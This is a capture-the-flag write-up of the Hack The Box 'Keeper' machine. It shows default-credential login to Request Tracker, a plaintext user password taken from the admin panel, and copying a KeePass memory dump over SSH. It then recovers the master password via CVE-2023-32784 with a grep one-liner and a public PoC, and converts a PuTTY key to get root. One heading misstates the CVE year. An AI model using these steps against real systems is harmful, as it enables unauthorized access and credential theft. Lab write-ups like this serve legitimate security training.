---
icon: ubuntu
---

# Keeper - Easy

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/keeper"><strong>Keeper</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.227 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 21:00 EST
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   96.07 ms 10.10.16.1
2   25.45 ms keeper.htb (10.10.11.227)
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see a link on the main page containing a subdomain let's update our hosts file

```shellscript
10.10.11.227 keeper.htb tickets.keeper.htb
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Searchinf for default creds

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>RT Default Creds</strong></p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And they work! Logging in we have access to the dashboard

There aren’t any tickets appearing in the categories it’s trying to show. There is one Queue, General, which has one new ticket. Clicking on that shows it’s an issue with Keepass

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The ticket history gives a more detailed overview

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There’s an issue with Keepass, and the lnorgaard user has a crashdumb for the root user.

Clicking on the user shows details for the user, but nothing new

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

However, as root, I can edit the user

<mark style="color:yellow;">**Admin -> Users -> select -> Inorgaard**</mark>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This password works for the Inorgaard user over SSH

```
Inorgaard:Welcome2023!
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

As mentioned in the ticket, there’s a zip archive in lnorgaard’s home directory

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I'll use scp to copy it to my machine

{% code overflow="wrap" %}
```shellscript
sshpass -p 'Welcome2023!' scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The zip archive contains 2 files

### <mark style="color:$primary;">CVE-2022-32784</mark>

#### <mark style="color:yellow;">Background</mark>

There’s a [2023 information disclosure vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2023-32784) in KeepPass such that:

In KeePass 2.x before 2.54, it is possible to recover the cleartext master password from a memory dump, even when a workspace is locked or no longer running. The memory dump can be a KeePass process dump, swap file (pagefile.sys), hibernation file (hiberfil.sys), or RAM dump of the entire system. The first character cannot be recovered. In 2.54, there is different API usage and/or random string insertion for mitigation.

I have a dump of the KeePass memory, so this seems like a good thing to try. I’ll show how to do it from both Linux and Windows.

At the time of Keeper’s release, there was really only one POC exploit on GitHub named [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper) in DotNet.

#### <mark style="color:yellow;">Theory</mark>

The issue is not that the KeePass key is in memory. It’s that when the user types their password in, the strings that get displayed back end up in memory.

For example, let’s take the password “password”. The first character goes in as a “●” (which is `\u25cf` or `\xcf\x25` in memory). The next character comes, and it will show up as “●a”. Then the next character will be “●●s”, then “●●●s”, then “●●●●w”, and so on, until we get to “●●●●●●●d”.

The exploits look through memory for strings that start with some number of “●” and then one character, and build out the most likely master key.

#### <mark style="color:yellow;">POC Manually</mark>

I can take a look at this manually using `strings` and `grep`. With `-e S`, strings will look for 8-bit characters, which will include what’s needed for the “●” (though it will show up as “%” in my terminal). Then I can `grep` for strings that start with two “●” to see potential matches for the keys being input:

{% code overflow="wrap" %}
```shellscript
strings -e S KeePassDumpFull.dmp | grep -a $(printf "%b" "\\xCF\\x25\\xCF\\x25")
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Exploit with Python</mark>

{% embed url="https://github.com/dawnl3ss/CVE-2023-32784" %}

{% code overflow="wrap" %}
```shellscript
git clone https://github.com/dawnl3ss/CVE-2023-32784.git
```
{% endcode %}

```shellscript
python poc.py ../KeePassDumpFull.dmp
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The exploit has a limitation of not getting the first character. Searching for the string online we find a pattern

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

That password works to get into the `passcodes.kdbx` file

```
rødgrød med fløde
```

```shellscript
kpcli --kdb passcodes.kdbx
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

There are 2 entries in passcodes/Network folder

I’ll go into that directory,`show` with `-f` will show the passwords. For example

<figure><img src="../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

We already know this, the more interesting is the SSH key for the server

<figure><img src="../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Convert Putty -> OpenSSH</mark>

To use this key on Linux, I’ll need to convert it to a format that openssh can understand. I’ll need putty tools \[`sudo apt install putty-tools`]. Save everything in the “Notes” section to a file, and make sure to remove all the leading whitespace from each line.

{% code title="Command to remove white spaces using vi" %}
```
:%s/\s\+//g
```
{% endcode %}

Careful the command above also removes the space in front of : you can just add that manually its only 6 line

Then convert it

```shellscript
puttygen root.ppk -O private-openssh -o root-id_rsa
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now you can ssh as root

<figure><img src="../../.gitbook/assets/image (3023).png" alt=""><figcaption></figcaption></figure>
